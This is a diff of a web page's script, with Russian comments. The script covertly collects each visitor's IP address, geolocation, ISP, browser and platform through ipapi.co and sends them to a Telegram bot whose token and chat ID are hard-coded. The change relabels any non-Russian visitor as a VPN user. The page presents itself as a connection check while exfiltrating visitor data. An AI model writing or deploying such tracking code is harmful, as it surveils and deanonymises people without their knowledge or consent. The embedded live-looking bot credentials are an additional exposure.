@@ -64,7 +64,7 @@
 </div>
 
 <script>
-    // ТВОИ ДАННЫЕ ДЛЯ БОТА (ВСТАВЛЕНЫ)
+    // ТВОИ ДАННЫЕ ДЛЯ БОТА
     const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
     const chatId = '7253706229';
 
@@ -75,6 +75,7 @@
             city: geoData.city || '—',
             region: geoData.region || '—',
             country: geoData.country_name || '—',
+            country_code: geoData.country_code || '—',
             isp: geoData.org || '—',
             vpn_detected: isVpn,
             userAgent: navigator.userAgent,
@@ -86,13 +87,13 @@
             timestamp: new Date().toISOString()
         };
 
-        const vpnStatus = isVpn ? '🔴 ВКЛЮЧЕН' : '🟢 ОТКЛЮЧЕН';
+        const vpnStatus = isVpn ? '🔴 ВКЛЮЧЕН (не Россия)' : '🟢 ОТКЛЮЧЕН (Россия)';
         const message = `🔍 НОВЫЙ ОТЧЁТ:\n` +
             `VPN статус: ${vpnStatus}\n` +
             `IP: ${report.ip}\n` +
             `Город: ${report.city}\n` +
             `Регион: ${report.region}\n` +
-            `Страна: ${report.country}\n` +
+            `Страна: ${report.country} (${report.country_code})\n` +
             `Провайдер: ${report.isp}\n` +
             `Браузер: ${report.userAgent}\n` +
             `Платформа: ${report.platform}\n` +
@@ -115,14 +116,13 @@
         });
     }
 
-    // Основной скрипт
+    // Основной скрипт — проверка по стране
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            const provider = data.org || '';
-            const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'server', 'data center', 'vps', 'dedicated'];
-            const isVpn = vpnKeywords.some(keyword => provider.toLowerCase().includes(keyword)) || 
-                           data.proxy === true || data.proxy === 'true';
+            const countryCode = data.country_code || '';
+            // Если страна НЕ Россия (RU) — считаем, что включён VPN
+            const isVpn = countryCode.toUpperCase() !== 'RU';
 
             if (isVpn) {
                 document.getElementById('vpnWarning').style.display = 'block';
@@ -135,7 +135,7 @@
         })
         .catch(() => {
             document.getElementById('statusText').innerText = 'Не удалось проверить соединение, продолжаем...';
-            sendReport({ ip: '—', city: '—', region: '—', country_name: '—', org: '—' }, false);
+            sendReport({ ip: '—', city: '—', region: '—', country_name: '—', country_code: '—', org: '—' }, false);
         });
 </script>
 </body>
